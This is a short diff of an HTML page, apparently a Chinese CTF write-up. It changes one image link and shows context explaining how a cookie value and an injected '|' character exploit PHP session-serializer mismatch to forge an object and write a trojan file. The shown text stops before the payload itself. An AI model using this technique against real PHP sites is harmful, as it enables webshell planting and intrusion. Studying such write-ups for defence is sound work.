@@ -512,7 +512,7 @@
 <p>file_put_contents(“log-“.$this-&gt;username, “使用”.$this-&gt;password.”登陆”.($this-&gt;status?”成功”:”失败”).”—-“.date_create()-&gt;format(‘Y-m-d H:i:s’));</p>
 </blockquote>
 <p>也就是说我们需要通过cookie传进去我们的恶意代码，看一下</p>
-<p><img src="D:\photo\image-20211021221915549.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211021221915549.png" srcset="/img/loading.gif" lazyload></p>
 <p><code>MQ%3D%3D</code>–&gt;<code>MQ==</code>–&gt;<code>a</code>，很明显的传值了，首先在cookie中设置limit值为payload，然后刷新index.php，此时session_start()开启了会话，盲猜是php_serialize引擎存储的对象数据，我们再通过访问包含了inc.php的check.php，就执行了设置php为引擎的代码，进而反序列化得到一个新的对象</p>
 <p>所以通过注入 <code>|</code> 字符伪造了对象的序列化数据，生成木马文件</p>
 <p>payload：</p>
